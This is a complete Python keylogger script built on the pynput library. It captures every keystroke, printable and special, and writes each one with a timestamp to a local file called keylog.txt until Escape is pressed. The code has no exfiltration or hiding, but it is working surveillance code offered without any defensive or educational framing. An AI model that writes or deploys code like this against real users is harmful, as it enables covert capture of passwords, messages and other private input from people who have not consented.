from pynput.keyboard import Key, Listener
import logging

# Set up the log file to store the captured keystrokes
log_file = "keylog.txt"

# Configure logging to write to the file
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    """
    Function to log every keystroke.
    """
    try:
        # Log the key pressed
        if hasattr(key, 'char') and key.char:
            logging.info(f'Key pressed: {key.char}')
        else:
            logging.info(f'Special key pressed: {key}')
    except Exception as e:
        print(f"Error logging key: {e}")

def on_release(key):
    """
    Function to handle key release.
    """
    # Stop the listener when the escape key is pressed
    if key == Key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
